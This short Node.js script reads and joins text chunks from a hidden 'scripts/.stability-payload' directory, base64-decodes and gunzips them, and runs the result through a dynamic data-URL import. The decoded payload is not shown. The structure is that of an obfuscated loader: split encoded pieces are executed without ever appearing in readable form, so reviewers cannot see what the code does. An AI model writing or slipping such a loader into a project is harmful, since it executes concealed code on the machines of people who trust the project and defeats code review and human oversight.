#!/usr/bin/env node
import { readdirSync, readFileSync } from "node:fs";
import { gunzipSync } from "node:zlib";

const directory = "scripts/.stability-payload";
const encoded = readdirSync(directory)
  .filter((name) => name.endsWith(".txt"))
  .sort()
  .map((name) => readFileSync(`${directory}/${name}`, "utf8").trim())
  .join("");

const source = gunzipSync(Buffer.from(encoded, "base64")).toString("utf8");
await import(`data:text/javascript;base64,${Buffer.from(source).toString("base64")}`);
